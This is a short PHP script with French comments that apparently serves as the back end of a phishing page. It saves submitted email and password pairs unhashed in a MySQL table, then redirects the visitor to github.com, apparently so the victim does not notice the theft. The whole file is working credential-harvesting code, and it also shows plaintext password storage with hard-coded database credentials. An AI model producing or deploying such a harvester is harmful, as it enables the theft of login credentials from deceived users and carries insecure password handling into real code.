<?php
$servername = "localhost";
$username = "soso";
$password = "soso";
$dbname = "utilisateurs_db";

// Créer une connexion
$conn = new mysqli($servername, $username, $password, $dbname);

// Vérifier la connexion
if ($conn->connect_error) {
    die("Connexion échouée: " . $conn->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['login'];
    $mot_de_passe = $_POST['password'];

    // Préparer et lier
    $stmt = $conn->prepare("INSERT INTO utilisateurs (email, mot_de_passe) VALUES (?, ?)");
    $stmt->bind_param("ss", $email, $mot_de_passe);

    // Exécuter la requête
    if ($stmt->execute()) {
        // echo "Informations enregistrées avec succès !";
        // redirection vers https://github.com
        header('Location: https://github.com');
    } else {
        echo "Erreur: " . $stmt->error;
    }

    // Fermer la déclaration et la connexion
    $stmt->close();
    $conn->close();
}
?>

